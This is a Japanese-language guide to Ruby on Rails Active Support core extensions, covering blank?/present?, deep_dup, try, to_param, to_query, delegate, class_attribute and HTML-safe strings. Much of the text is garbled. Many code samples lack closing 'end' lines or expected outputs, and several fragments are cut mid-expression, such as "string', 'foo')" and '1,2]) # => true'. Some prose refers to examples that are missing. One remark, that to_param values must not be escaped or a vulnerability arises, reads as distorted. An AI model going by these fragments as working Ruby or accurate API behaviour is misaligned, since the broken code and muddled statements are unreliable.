この定義がどのように読み込まれるかを見てみましょう。
#### 必要な定義だけを選ぶ
`blank?`メソッドを使えるようにする最も「軽量な」方法は、そのメソッドが定義されているファイルだけを選んで読み込むことです。
本ガイドでは、コア拡張機能として定義されているすべてのメソッドについて、その定義ファイルの置き場所も示してあります。
たとえば`blank?`の場合、以下のようなメモを追加してあります。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/blank.rb`です。
つまり、以下のようにピンポイントでrequireを実行することができます。
require 'active_support/core_ext/object/blank'
Active Supportの改訂は注意深く行われていますので、あるファイルを選んだ場合、本当に必要な依存ファイルだけが同時に読み込まれます(依存関係がある場合)。
#### コア拡張機能をグループ化して読み込む
次の段階として、`Object`に対するすべての拡張機能を単に読み込んでみましょう。
経験則として、`SomeClass`というクラスがあれば、`active_support/core_ext/some_class`というパスを指定することで一度に読み込めます。
従って、(`blank?`を含む)`Object`に対するすべての拡張機能を読み込む場合には以下のようにします。
require 'active_support/core_ext/object'
#### すべてのコア拡張機能を読み込む
すべてのコア拡張機能を単に読み込んでおきたいのであれば、以下のようにrequireします。
require 'active_support/core_ext'
#### すべてのActive Supportを読み込む
最後に、利用可能なActive Supportをすべて読み込みたい場合は以下のようにします。
require 'active_support/all'
ただし、これを実行してもActive Support全体がメモリに読み込まれるわけではないことにご注意ください。一部は`autoload`として設定されており、実際に使うまで読み込まれません。
### Ruby on RailsアプリケーションでActive Supportを使用する
このオプションをtrueにすると、フレームワーク自体が必要とするまでアプリケーションは拡張機能を読み込みません。また、読み込まれる拡張機能の選択は、上で解説したように、あらゆる粒度で行われます。
すべてのオブジェクトで使用できる拡張機能
### `blank?`と`present?`
Railsアプリケーションは以下の値を空白(blank)とみなします。
* `nil`と`false`
* 空白文字 (whitespace) だけで構成された文字列 (以下の注釈参照)
* 空欄の配列とハッシュ
* その他、`empty?`メソッドに応答するオブジェクトはすべて空白として扱われます。
INFO: 文字列を判定する述語として、Unicode対応した文字クラスである`[:space:]`が使用されています。そのため、たとえばU+2029 (段落区切り文字)は空白文字と判断されます。
WARNING: 数字については空白であるかどうかは判断されません。
特に0および0.0は**空白ではありません**のでご注意ください。
たとえば、`ActionController::HttpAuthentication::Token::ControllerMethods`にある以下のメソッドでは`blank?`を使用してトークンが存在しているかどうかをチェックしています。
def authenticate(controller, &login_procedure)
  token, options = token_and_options(controller.request)
  unless token.blank?
    login_procedure.call(token, options)
`present?`メソッドは`!blank?`メソッドと同等です。
以下の例は`ActionDispatch::Http::Cache::Response`から引用しました。
def set_conditional_cache_control!
  return if self["Cache-Control"].present?
`presence`メソッドは、`present?`がtrueの場合は自身のレシーバを返し、falseの場合は`nil`を返します。
このメソッドは以下のような定番の用法において便利です。
host = config[:host].presence || 'localhost'
### `duplicable?
Rubyにおける基本的なオブジェクトの一部はsingletonオブジェクトです。
たとえば、プログラムのライフサイクルが続く間、整数の1は常に同じインスタンスを参照します。
1.object_id                 # => 3
Math.cos(0).to_i.object_id  # => 3
従って、このようなオブジェクトは`dup`メソッドや`clone`メソッドで複製することはできません。
true.dup  # => TypeError: can't dup TrueClass
singletonでない数字にも、複製不可能なものがあります。
0.0.clone        # => allocator undefined for Float
(2**1024).clone  # => allocator undefined for Bignum
Active Supportには、オブジェクトがプログラム的に複製可能かどうかを問い合わせるための`duplicable?`メソッドがあります。
"foo".duplicable? 
"".duplicable?    
false.duplicable? 
デフォルトでは、`nil`、`false`、`true`、シンボル、数値、クラス、モジュール、メソッドオブジェクトを除くすべてのオブジェクトが`duplicable?` #=> trueです。
WARNING: どんなクラスでも、`dup`メソッドと`clone`メソッドを除去することでこれらのメソッドを無効にしてしまうことができます。このとき、これらのメソッドが実行されると例外が発生します。
このような状態では、どんなオブジェクトについてもそれが複製可能かどうかを確認するには`rescue`を使用する以外に方法はありません。
`duplicable?`メソッドは、上のハードコードされたリストに依存しますが、その代わり`rescue`よりずっと高速です。
実際のユースケースでハードコードされたリストで十分であることがわかっている場合には、`duplicable?`をお使いください。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/duplicable.rb`です。
### `deep_dup`
`deep_dup`メソッドは、与えられたオブジェクトの「ディープコピー」を返します。
Rubyは通常の場合、他のオブジェクトを含むオブジェクトを`dup`しても、他のオブジェクトについては複製しません。このようなコピーは「浅いコピー (shallow copy)」と呼ばれます。
たとえば、以下のように文字列を含む配列があるとします。
array     = ['string']
duplicate = array.dup
duplicate.push 'another-string'
# このオブジェクトは複製されたので、複製された方にだけ要素が追加された
array     # => ['string']
duplicate # => ['string', 'another-string']
string', 'foo')
# 1つ目の要素は複製されていないので、一方を変更するとどちらの配列も変更される
array     # => ['foo']
duplicate # => ['foo', 'another-string']
上で見たとおり、`Array`のインスタンスを複製して別のオブジェクトができたことにより、一方を変更しても他方は変更されないようになりました。
ただし、配列は複製されましたが、配列の要素はそうではありません。
`dup`メソッドはディープコピーを行わないので、配列の中にある文字列は複製後も同一オブジェクトのままです。
オブジェクトをディープコピーする必要がある場合は`deep_dup`をお使いください。
例:
duplicate = array.deep_dup
duplicate # => ['foo']
オブジェクトが複製不可能な場合、`deep_dup`は単にそのオブジェクトを返します。
number = 1
duplicate = number.deep_dup
number.object_id == duplicate.object_id   # => true
NOTE: 定義ファイルの場所は`active_support/core_ext/object/deep_dup.rb`です。
### `try`
`nil`でない場合にのみオブジェクトのメソッドを呼び出したい場合、最も単純な方法は条件文を追加することですが、どこか冗長になってしまいます。
そこで`try`メソッドを使うという手があります。`try`は`Object#send`と似ていますが、`nil`に送信された場合には`nil`を返す点が異なります。
# tryメソッドを使用しない場合
unless @number.nil?
  @number.next
# tryメソッドを使用した場合
@number.try(:next)
`ActiveRecord::ConnectionAdapters::AbstractAdapter`から別の例として以下をご紹介します。ここでは`@logger`が`nil`になることがあります。
このコードでは`try`を使用したことで余分なチェックを行わずに済んでいます。
def log_info(sql, name, ms)
  if @logger.try(:debug?)
    name = '%s (%.1fms)' % [name || 'SQL', ms]
    @logger.debug(format_log_entry(name, sql.squeeze(' ')))
`try`メソッドは引数の代りにブロックを与えて呼び出すこともできます。この場合オブジェクトが`nil`でない場合にのみブロックが実行されます。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/try.rb`です。
### `class_eval(*args, &block)`
`class_eval`メソッドを使用することで、あらゆるオブジェクトのsingletonクラスのコンテキストでコードを評価することができます。
class Proc
  def bind(object)
    block, time = self, Time.current
    object.class_eval do
      method_name = "__bind_#{time.to_i}_#{time.usec}"
      define_method(method_name, &block)
      method = instance_method(method_name)
      remove_method(method_name)
      method
    end.bind(object)
NOTE: 定義ファイルの場所は`active_support/core_ext/kernel/singleton_class.rb`です。
### `acts_like?(
`acts_like?`メソッドは、一部のクラスがその他のクラスと同様に振る舞うかどうかのチェックを、ある慣例に則って実行します。`String`クラスと同じインターフェイスを提供するクラスがあり、その中で以下のメソッドを定義しておくとします。
def acts_like_string?
このメソッドは単なる目印であり、メソッドの本体と戻り値の間には関連はありません。
これにより、クライアントコードで以下のようなダックタイピングチェックを行なうことができます。
some_klass.acts_like?(:string)
Railsには`Date`クラスや`Time`クラスと同様に振る舞うクラスがいくつかあり、この手法を使用できます。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/acts_like.rb`です。
### `to_param`
Railsのあらゆるオブジェクトは`to_param`メソッドに応答します。これは、オブジェクトを値として表現するものを返すということです。返された値はクエリ文字列やURLの一部で使用できます。
デフォルトでは、`to_param`メソッドは単に`to_s`メソッドを呼び出します。
7.to_param # => "7"
`to_param`によって返された値を **エスケープしてはいけません** 。脆弱性が生じます。
"Tom & Jerry".to_param # => "Tom & Jerry"
このメソッドは、Railsの多くのクラスで上書きされています。
たとえば、`nil`、`true`、`false`の場合は自分自身を返します。
`Array#to_param`を実行すると、`to_param`が配列内の各要素に対して実行され、結果が"/"でjoinされます。
[0, true, String].to_param # => "0/true/String"
特に、Railsのルーティングシステムはモデルに対して`to_param`メソッドを実行することで、`:id`プレースホルダの値を取得しています。
`ActiveRecord::Base#to_param`はモデルの`id`を返しますが、このメソッドをモデル内で再定義することもできます。
class User
  def to_param
    "#{id}-#{name.parameterize}"
以下の結果を得ます。
user_path(@user) # => "/users/357-john-smith"
WARNING: コントローラ側では、`to_param`メソッドがモデル側で再定義されている可能性があることに常に注意しておく必要があります。上のようなリクエストを受信した場合、`params[:id]`の値が"357-john-smith"になるからです。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/to_param.rb`です。
### `to_query`
このメソッドは、エスケープされていない`key`を受け取ると、そのキーを`to_param`が返す値に対応させるクエリ文字列の一部を生成します。ただしハッシュは例外です(後述)。
たとえば以下の場合、
このメソッドは、キーと値のいずれについても、必要な箇所をすべてエスケープします。
account.to_query('company[name]')
# => "company%5Bname%5D=Johnson+%26+Johnson"
従って、この結果はそのままクエリ文字列として使用できます。
配列に`to_query`メソッドを適用した場合、`to_query`を配列の各要素に適用して`_key_[]`をキーとして追加し、それらを"&"で連結したものを返します。
[3.4, -45.6].to_query('sample')
# => "sample%5B%5D=3.4&sample%5B%5D=-45.6"
ハッシュも`to_query`に応答しますが、異なるシグネチャを使用します。
メソッドに引数が渡されない場合、このメソッド呼び出しは、一連のキー/値ペアをソート済みの形で生成し、それぞれの値に対して`to_query(key)`を呼び出します。
続いて結果を"&"で連結します。
{c: 3, b: 2, a: 1}.to_query # => "a=1&b=2&c=3"
`Hash#to_query`メソッドは、それらのキーに対して名前空間をオプションで与えることもできます。
{id: 89, name: "John Smith"}.to_query('user')
# => "user%5Bid%5D=89&user%5Bname%5D=John+Smith"
NOTE: 定義ファイルの場所は`active_support/core_ext/object/to_query.rb`です。
### `with_options`
`with_options`メソッドは、連続した複数のメソッド呼び出しに対して共通して与えられるオプションを解釈するための手段を提供します。
デフォルトのオプションがハッシュで与えられると、`with_options`はブロックに対するプロキシオブジェクトを生成します。
そのブロック内では、プロキシに対して呼び出されたメソッドにオプションを追加したうえで、そのメソッドをレシーバに転送します。
たとえば、以下のように同じオプションを繰り返さないで済むようになります。
  has_many :customers, dependent: :destroy
  has_many :products,  dependent: :destroy
  has_many :invoices,  dependent: :destroy
  has_many :expenses,  dependent: :destroy
上は以下のようにできます。
  with_options dependent: :destroy do |assoc|
    assoc.has_many :customers
    assoc.has_many :products
    assoc.has_many :invoices
    assoc.has_many :expenses
この手法を使用することで、たとえばニュースレターの読者を言語ごとに _グループ化_ することができます。
読者が話す言語に応じて異なるニュースレターを送信したいとします。
メイル送信用のコードのどこかで、以下のような感じでロケール依存ビットをグループ化することができます。
I18n.with_options locale: user.locale, scope: "newsletter" do |i18n|
  subject i18n.t :subject
  body    i18n.t :body, user_name: user.name
TIP: `with_options`はメソッドをレシーバに転送しているので、呼び出しをネストすることもできます。
各ネスティングレベルでは、自身の呼び出しに、継承したデフォルト呼び出しをマージします。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/with_options.rb`です。
### JSON support
Active Supportが提供する`to_json`メソッドの実装は、通常`json` gemがRubyオブジェクトに対して提供している`to_json`よりも優れています。
その理由は、`Hash`や`OrderedHash`、`Process::Status`などのクラスでは、正しいJSON表現を提供するために特別な処理が必要になるためです。
NOTE: 定義ファイルの場所は`active_support/core_ext/object/json.rb`です。
### インスタンス変数
Active Supportは、インスタンス変数に簡単にアクセスするためのメソッドを多数提供しています。
#### `instance_values`
`instance_values`メソッドはハッシュを返します。インスタンス変数名から"@"を除いたものがハッシュのキーに、インスタンス変数の値がハッシュの値にマップされます。
キーは文字列です。
class C
  def initialize(x, y)
    @x, @y = x, y
C.new(0, 1).instance_values # => {"x" => 0, "y" => 1}
NOTE: 定義ファイルの場所は`active_support/core_ext/object/instance_variables.rb`です。
#### `instance_variable_names`
`instance_variable_names`メソッドは配列を返します。
配列のインスタンス名には"@"記号が含まれます。
C.new(0, 1).instance_variable_names # => ["@x", "@y"]
`silence_warnings`メソッドと`enable_warnings`メソッドは、ブロックが継続する間`$VERBOSE`の値を変更し、その後リセットします。
silence_warnings { Object.const_set "RAILS_DEFAULT_LOGGER", logger }
`suppress`メソッドを使用すると例外の発生を止めることもできます。
このメソッドは、例外クラスを表す任意の数値を受け取ります。
`suppress`は、あるブロックの実行時に例外が発生し、その例外が(`kind_of?`による判定で)いずれかの引数に一致する場合、それをキャプチャして例外を発生せずに戻ります。
一致しない場合、例外はキャプチャされません。
# ユーザーがロックされていればインクリメントは失われるが、重要ではない
suppress(ActiveRecord::StaleObjectError) do
  current_user.increment! :visits
NOTE: 定義ファイルの場所は`active_support/core_ext/kernel/reporting.rb`です。
### `in?
述語`in?`は、あるオブジェクトが他のオブジェクトに含まれているかどうかをテストします。
渡された引数が`include?`に応答しない場合は`ArgumentError`例外が発生します。
`in?`の例を示します。
1,2])        # => true
hello")   # => true
30..50)      # => false
1)            # => ArgumentError
NOTE: 定義ファイルの場所は`active_support/core_ext/object/inclusion.rb`です。
`Module`の拡張
### `alias_method_chain`
拡張されていない純粋なRubyを使用して、メソッドを他のメソッドで包み込む(wrap)ことができます。これは _エイリアスチェーン (alias chaining)_ と呼ばれています。
たとえば、機能テストのときにはパラメータが (実際のリクエストのときと同様に) 文字列であって欲しいとします。しかし必要なときには整数など他の型の値を持つこともできるようにしておきたいとします。
これを実現するには、`ActionController::TestCase#process`を以下のように`test/test_helper.rb`でラップします。
ActionController::TestCase.class_eval do
  # 元のプロセスメソッドへの参照を保存
  alias_method :original_process, :process
  def process(action, params=nil, session=nil, flash=nil, http_method='GET')
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    original_process(action, params, session, flash, http_method)
これは、`get`、`post`メソッドなどが作業を委譲するときに使われる手法です。
この手法には、`:original_process`が取得される可能性があるというリスクがあります。
エイリアスチェーンが行われる対象を特徴付けるラベルが選ばれるときにそのような衝突を回避するには、次のようにします。
  def process_with_stringified_params(...)
    process_without_stringified_params(action, params, session, flash, http_method)
  alias_method :process_without_stringified_params, :process
  alias_method :process, :process_with_stringified_params
`alias_method_chain`メソッドを使用すると、上のようなパターンを簡単に行えます。
  alias_method_chain :process, :stringified_params
NOTE: 定義ファイルの場所は`active_support/core_ext/module/aliasing.rb`です。
### 属性
#### `alias_attribute`
モデルの属性には、リーダー (reader)、ライター (writer)、述語 (predicate) があります。
上に対応する3つのメソッドを持つ、モデルの属性の別名 (alias) を一度に作成することができます。
他の別名作成メソッドと同様、1つ目の引数には新しい名前、2つ目の引数には元の名前を指定します (変数に代入するときと同じ順序、と覚えておく手もあります)。
  # emailカラムを"login"という名前でも参照したい
  # そうすることで認証のコードがわかりやすくなる
#### 内部属性
あるクラスで属性を定義すると、後にそのクラスのサブクラスが作成されるときに名前が衝突するリスクが生じます。
これはライブラリにおいては特に重要な問題です。
Active Supportでは、`attr_internal_reader`、`attr_internal_writer`、`attr_internal_accessor`というマクロが定義されています。
これらのマクロは、Rubyにビルトインされている`attr_*`と同様に振る舞いますが、内部のインスタンス変数の名前が衝突しにくいように配慮される点が異なります。
`attr_internal`マクロは`attr_internal_accessor`と同義です。
# ライブラリ
class ThirdPartyLibrary::Crawler
  attr_internal :log_level
# クライアントコード
class MyCrawler < ThirdPartyLibrary::Crawler
  attr_accessor :log_level
先の例では、`:log_level`はライブラリのパブリックインターフェイスに属さず、開発用途にのみ使用されます。
クライアント側のコードでは衝突の可能性について考慮せずに独自に`:log_level`をサブクラスで定義しています。
このとき、内部インスタンス変数の名前にはデフォルトで冒頭にアンダースコアが追加されます。上の例であれば`@_log_level`となります。
この動作は`Module.attr_internal_naming_format`を使用して変更することもできます。`sprintf`と同様のフォーマット文字列を与え、冒頭に`@`を置き、それ以外の名前を置きたい場所に`%s`を置きます。
デフォルト値は`"@_%s"`です。
Railsではこの内部属性を他の場所でも若干使用しています。たとえばビューでは以下のように使用しています。
module ActionView
  class Base
    attr_internal :captures
    attr_internal :request, :layout
    attr_internal :controller, :template
NOTE: 定義ファイルの場所は`active_support/core_ext/module/attr_internal.rb`です。
#### モジュール属性
`mattr_reader`、`mattr_writer`、`mattr_accessor`という3つのマクロは、クラス用に定義される`cattr_*`マクロと同じです。
実際、`cattr_*`マクロは単なる`mattr_*`マクロの別名です。
[クラス属性](#class属性)も参照してください。
たとえば、これらのマクロは以下のDependenciesモジュールで使用されています。
module ActiveSupport
  module Dependencies
    mattr_accessor :warnings_on_first_load
    mattr_accessor :history
    mattr_accessor :loaded
    mattr_accessor :mechanism
    mattr_accessor :load_paths
    mattr_accessor :load_once_paths
    mattr_accessor :autoloaded_constants
    mattr_accessor :explicitly_unloadable_constants
    mattr_accessor :logger
    mattr_accessor :log_activity
    mattr_accessor :constant_watch_stack
    mattr_accessor :constant_watch_stack_mutex
NOTE: 定義ファイルの場所は`active_support/core_ext/module/attribute_accessors.rb`です。
### 親
#### `parent`
`parent`メソッドは、名前がネストしたモジュールに対して実行でき、対応する定数を持つモジュールを返します。
module X
  module Y
    module Z
M = X::Y::Z
X::Y::Z.parent # => X::Y
M.parent       # => X::Y
モジュールが無名またはトップレベルの場合、`parent`は`Object`を返します。
WARNING: `parent_name`は上の場合でも`nil`を返します。
NOTE: 定義ファイルの場所は`active_support/core_ext/module/introspection.rb`です。
#### `parent_name`
`parent_name`メソッドは、名前がネストしたモジュールに対して実行でき、対応する定数を持つモジュールを返します。
X::Y::Z.parent_name # => "X::Y"
M.parent_name       # => "X::Y"
モジュールが無名またはトップレベルの場合、`parent_name`は`nil`を返します。
WARNING: `parent`は上の場合でも`Object`を返します。
NOTE: 定義ファイルの場所は`active_support/core_ext/module/introspection.rb`。
#### `parents`
`parents`メソッドは、レシーバに対して`parent`を呼び出し、`Object`に到着するまでパスをさかのぼります。
連鎖したモジュールは、階層の下から上の順に配列として返されます。
X::Y::Z.parents # => [X::Y, X, Object]
M.parents       # => [X::Y, X, Object]
### 定数
`local_constants`メソッドは、レシーバモジュールで定義された定数名を返します。
  X1 = 1
  X2 = 2
    Y1 = :y1
    X1 = :overrides_X1_above
X.local_constants    # => [:X1, :X2, :Y]
X::Y.local_constants # => [:Y1, :X1]
定数名はシンボルとして返されます。
#### 正規の定数名
Active SupportではこのAPIを拡張し、よりフルパスに近い(qualified)定数名を渡せるようにしています。
新しいメソッドは`qualified_const_defined?`、`qualified_const_get`、`qualified_const_set`です。
これらのメソッドに渡す引数は、レシーバからの相対的な修飾済み定数名であることが前提となります。
Object.qualified_const_defined?("Math::PI")       # => true
Object.qualified_const_get("Math::PI")            # => 3.141592653589793
Object.qualified_const_set("Math::Phi", 1.618034) # => 1.618034
修飾されていない、素の定数名も使用できます。
Math.qualified_const_get("E") # => 2.718281828459045
これらのメソッドは、ビルトイン版のメソッドと類似しています。
特に、`qualified_constant_defined?`メソッドは2つ目の引数として、述語を先祖に向って遡って探すかどうかというフラグをオプションで指定できます。
このフラグは、与えられたすべての定数について、メソッドでパスを下る時に適用されます。
以下の例で考察してみましょう。
module M
  X = 1
module N
  class C
    include M
`qualified_const_defined?`は以下のように動作します。
C::X", false) # => false
C::X", true)  # => true
C::X")        # => true
最後の例でわかるように、`const_defined?`メソッドと同様に2番目の引数はデフォルトでtrueになります。
ビルトインメソッドと一貫させるため、相対パス以外は利用できません。
`::Math::PI`のような絶対定数名を指定すると`NameError`が発生します。
NOTE: 定義ファイルの場所は`active_support/core_ext/module/qualified_const.rb`です。
### 到達可能
名前を持つモジュールは、対応する定数に保存されている場合に到達可能 (reachable) となります。
これは、定数を経由してモジュールオブジェクトに到達できるという意味です。
これは通常の動作です。"M"というモジュールがあるとすると、`M`という定数が存在し、そこにモジュールが保持されます。
M.reachable? 
しかし、定数とモジュールが実質上切り離されると、そのモジュールオブジェクトは到着不能 (unreachable) になります。
orphan = Object.send(:remove_const, :M)
# このモジュールは孤立しているが、まだ無名ではない
orphan.name # => "M"
# 定数Mは既に存在してないので、定数Mを経由して到達できない
orphan.reachable? 
# "M"という名前のモジュールを再度定義する
# 定数Mが再度存在し、モジュールオブジェクト"M"を保持しているが
# 元と異なる新しいインスタンスである
NOTE: 定義ファイルの場所は`active_support/core_ext/module/reachable.rb`です。
### 無名モジュール
モジュールは名前を持つことも、無名でいることもできます。
M.name # => "M"
N = Module.new
N.name # => "N"
Module.new.name # => nil
述語`anonymous?`を使用して、モジュールに名前があるかどうかをチェックできます。
Module.new.anonymous? 
到達不能 (unreachable) であっても、必ずしも無名 (anonymous) になるとは限りません。
m = Object.send(:remove_const, :M)
m.reachable? 
m.anonymous? 
逆に無名モジュールは、定義上必ず到達不能になります。
NOTE: 定義ファイルの場所は`active_support/core_ext/module/anonymous.rb`です。
### メソッド委譲
`delegate`マクロを使用すると、メソッドを簡単に委譲できます。
あるアプリケーションの`User`モデルにログイン情報があり、それに関連する名前などの情報は`Profile`モデルにあるとします。
  has_one :profile
この構成では、`user.profile.name`のようにプロファイル越しにユーザー名を取得することになります。これらの属性に直接アクセスできたらもっと便利になることでしょう。
    profile.name
`delegate`を使用すればできるようになります。
  delegate :name, to: :profile
この方法なら記述が短くて済み、意味もはっきりします。
使用するメソッドは対象クラス内でpublicである必要があります。
`delegate`マクロには複数のメソッドを指定できます。
delegate :name, :age, :address, :twitter, to: :profile
`:to`オプションが文字列に変換されると、メソッドの委譲先となるオブジェクトに評価される式になります。
通常は文字列またはシンボルになります。
そのような式は、レシーバのコンテキストで評価されます。
# Rails定数を委譲する
delegate :logger, to: :Rails
# レシーバのクラスに委譲する
delegate :table_name, to: :class
WARNING: `:prefix`オプションが`true`の場合、一般性が低下します (後述)。
委譲時に`NoMethodError`が発生して対象が`nil`の場合、例外が発生します。
`:allow_nil`オプションを使用すると、例外の代りに`nil`を返すようにすることができます。
delegate :name, to: :profile, allow_nil: true
`:allow_nil`を指定すると、ユーザーのプロファイルがない場合に`user.name`呼び出しは`nil`を返します。
`:prefix`オプションをtrueにすると、生成されたメソッドの名前にプレフィックスを追加します。
これは、たとえばよりよい名前にしたい場合に便利です。
delegate :street, to: :address, prefix: true
上の例では、`street`ではなく`address_street`が生成されます。
WARNING: この場合、生成されるメソッドの名前では、対象となるオブジェクト名とメソッド名が使用されます。`:to`オプションで指定するのはメソッド名でなければなりません。
プレフィックスをカスタマイズすることもできます。
delegate :size, to: :attachment, prefix: :avatar
上の例では、マクロによって`size`の代わりに`avatar_size`が生成されます。
NOTE: 定義ファイルの場所は`active_support/core_ext/module/delegation.rb`です。
### メソッドの再定義
`define_method`を使用してメソッドを再定義する必要があるが、その名前が既にあるかどうかがわからないとことがあります。
有効な名前が既にあれば警告が表示されます。
警告が表示されても大したことはありませんが、邪魔に思えることもあります。
`redefine_method`メソッドを使用すれば、必要に応じて既存のメソッドが削除されるので、このような警告表示を抑制できます。
NOTE: 定義ファイルの場所は`active_support/core_ext/module/remove_method.rb`です。
`Class`の拡張
### Class属性
#### `class_attribute`
`class_attribute`メソッドは、1つ以上の継承可能なクラスの属性を宣言します。そのクラス属性は、その下のどの階層でも上書き可能です。
  class_attribute :x
class B < A; end
class C < B; end
A.x = :a
B.x # => :a
C.x # => :a
B.x = :b
A.x # => :a
C.x # => :b
C.x = :c
B.x # => :b
たとえば、`ActionMailer::Base`に以下の定義があるとします。
class_attribute :default_params
self.default_params = {
  mime_version: "1.0",
  charset: "UTF-8",
  content_type: "text/plain",
  parts_order: [ "text/plain", "text/enriched", "text/html" ]
}.freeze
これらの属性はインスタンスのレベルでアクセスまたはオーバーライドできます。
A.x = 1
a1 = A.new
a2 = A.new
a2.x = 2
a1.x # => 1 (Aが使われる)
a2.x # => 2 (a2でオーバーライドされる)
`:instance_writer`を`false`に設定すれば、writerインスタンスメソッドは生成されません。
module ActiveRecord
    class_attribute :table_name_prefix, instance_writer: false
    self.table_name_prefix = ""
上のオプションは、モデルの属性設定時にマスアサインメントを防止するのに便利です。
`:instance_reader`を`false`に設定すれば、readerインスタンスメソッドは生成されません。
  class_attribute :x, instance_reader: false
A.new.x = 1 # NoMethodError
利便性のために、`class_attribute`は、インスタンスのreaderが返すものを「二重否定」するインスタンス述語も定義されます。
上の例の場合、`x?`となります。
`:instance_reader`が`false`の場合、インスタンス述語はreaderメソッドと同様に`NoMethodError`を返します。
インスタンス述語が不要な場合、`instance_predicate: false`を指定すれば定義されなくなります。
NOTE: 定義ファイルの場所は`active_support/core_ext/class/attribute.rb`です。
#### `cattr_reader`、`cattr_writer`、`cattr_accessor`
`cattr_reader`、`cattr_writer`、`cattr_accessor`マクロは、`attr_*`と似ていますが、クラス用である点が異なります。
これらのメソッドは、クラス変数を`nil`に設定し (クラス変数が既にある場合を除く)、対応するクラスメソッドを生成してアクセスできるようにします。
class MysqlAdapter < AbstractAdapter
  # @@emulate_booleansにアクセスできるクラスメソッドを生成する
  cattr_accessor :emulate_booleans
  self.emulate_booleans = true
利便性のため、このときインスタンスメソッドも生成されますが、これらは実際にはクラス属性の単なるプロキシです。
従って、インスタンスからクラス属性を変更することはできますが、`class_attribute`で行われるように上書きすることはできません(上記参照)。
たとえば以下の場合、
    cattr_accessor :field_error_proc
    @@field_error_proc = Proc.new{ ... }
ビューで`field_error_proc`にアクセスできます。
同様に、`cattr_*`にブロックを渡して属性にデフォルト値を設定することもできます。
  # @@emulate_booleansにアクセスしてデフォルト値をtrueにするクラスメソッドを生成
  cattr_accessor(:emulate_booleans) { true }
`:instance_reader`オプションを`false`に設定することで、readerインスタンスメソッドが生成されないようにできます。同様に、`:instance_writer`オプションを`false`に設定することで、writerインスタンスメソッドが生成されないようにできます。
`:instance_accessor`オプションを`false`に設定すれば、どちらのインスタンスメソッドも生成されません。
いずれの場合も、指定できる値は`false`のみです。'nil'など他のfalse値は指定できません。
module A
  class B
    # first_nameインスタンスreaderは生成されない
    cattr_accessor :first_name, instance_reader: false
    # last_name= インスタンスwriterは生成されない
    cattr_accessor :last_name, instance_writer: false
    # surnameインスタンスreaderもsurname= インスタンスwriterも生成されない
    cattr_accessor :surname, instance_accessor: false
`:instance_accessor`を`false`に設定すると、モデルの属性設定時にマスアサインメントを防止するのに便利です。
### サブクラスと子孫
#### `subclasses`
`subclasses`メソッドはレシーバのサブクラスを返します。
class C; end
C.subclasses # => []
class B < C; end
C.subclasses # => [B]
class A < B; end
class D < C; end
C.subclasses # => [B, D]
返されるクラスの順序は一定ではありません。
NOTE: 定義ファイルの場所は`active_support/core_ext/class/subclasses.rb`です。
#### `descendants`
`descendants`メソッドは、そのレシーバより下位にあるすべてのクラスを返します。
C.descendants # => []
C.descendants # => [B]
C.descendants # => [B, A]
C.descendants # => [B, A, D]
`String`の拡張
### 安全な出力
#### 開発の動機
HTMLテンプレートにデータを挿入する方法は、きわめて慎重に設計する必要があります。
たとえば、`@review.title`を何の工夫もなくそのままHTMLに式展開するようなことは絶対にすべきではありません。
もしこのレビューのタイトルが仮に"Flanagan & Matz rules!"だとしたら、出力はwell-formedになりません。well-formedにするには、"&amp;amp;"のようにエスケープしなければなりません。
さらに、ユーザーがレビューのタイトルに細工をして、悪意のあるHTMLをタイトルに含めれば、巨大なセキュリティホールになることすらあります。
このリスクの詳細については、[セキュリティガイド](security.html#クロスサイトスクリプティング-xss)のクロスサイトスクリプティングの節を参照してください。
#### 安全な文字列
Active Supportには「(html的に) 安全な文字列」という概念があります。
安全な文字列とは、HTMLにそのまま挿入しても問題がないというマークが付けられている文字列です。
マーキングさえされていれば、「実際にエスケープされているかどうかにかかわらず」その文字列は信頼されます。
文字列はデフォルトでは _unsafe_ とマークされます。
"".html_safe? 
与えられた文字列に`html_safe`メソッドを適用することで、安全な文字列を得ることができます。
s = "".html_safe
s.html_safe? 
ここで注意しなければならないのは、`html_safe`メソッドそれ自体は何らエスケープを行なっていないということです。安全であるとマーキングしているに過ぎません。
s = "<script>...</script>".html_safe
s            # => "<script>...</script>"
従って、特定の文字列に対して`html_safe`メソッドを呼び出す際には、その文字列が本当に安全であることを確認する義務があります。
安全であると宣言された文字列に対し、安全でない文字列を`concat`/`<<`または`+`を使用して破壊的に追加すると、結果は安全な文字列になります。
安全でない引数は追加時にエスケープされます。
"".html_safe + "<" # => "&lt;"
安全な引数であれば、(エスケープなしで)直接追加されます。
"".html_safe + "<".html_safe # => "<"
基本的にこれらのメソッドは、通常のビューでは使用しないでください。
現在のRailsのビューでは、安全でない値は自動的にエスケープされるためです。
<%= @review.title %> <%# 必要に応じてエスケープされるので問題なし %>
何らかの理由で、エスケープされていない文字列を挿入したい場合は、`html_safe`を呼ぶのではなく、`raw`ヘルパーを使用するようにしてください。
<%= raw @cms.current_template %> <%# @cms.current_templateをそのまま挿入 %>
あるいは、`raw`と同等の`<%==`を使用します。
<%== @cms.current_template %> <%# @cms.current_templateをそのまま挿入 %>
`raw`ヘルパーは、内部で`html_safe`を呼び出します。
def raw(stringish)
  stringish.to_s.html_safe
NOTE: 定義ファイルの場所は`active_support/core_ext/string/output_safety.rb`です。
#### 各種変換
経験上、上で説明したような連結 (concatenation) 操作を除き、どんなメソッドでも潜在的には文字列を安全でないものに変換してしまう可能性があることに常に注意を払う必要があります。
そのようなメソッドには`downcase`、`gsub`、`strip`、`chomp`、`underscore`などがあります。
`gsub!`のような破壊的な変換を行なうメソッドを使用すると、レシーバ自体が安全でなくなります。
INFO: こうしたメソッドを実行すると、実際に変換が行われたかどうかにかかわらず、安全を表すビットは常にオフになります。
#### 変換と強制
安全な文字列に対して`to_s`を実行した場合は、安全な文字列が返されます。しかし、`to_str`による強制的な変換を実行した場合には安全でない文字列が返されます。
#### コピー
安全な文字列に対して`dup`または`clone`を実行した場合は、安全な文字列が生成されます。
### `remove`
`remove`メソッドを実行すると、すべての該当パターンが削除されます。
Hello World"
このメソッドには破壊的なバージョンの`String#remove!`もあります。
NOTE: 定義ファイルの場所は`active_support/core_ext/string/filters.rb`です。
### `squish`
`squish`メソッドは、冒頭と末尾のホワイトスペースを除去し、連続したホワイトスペースを1つに減らします。
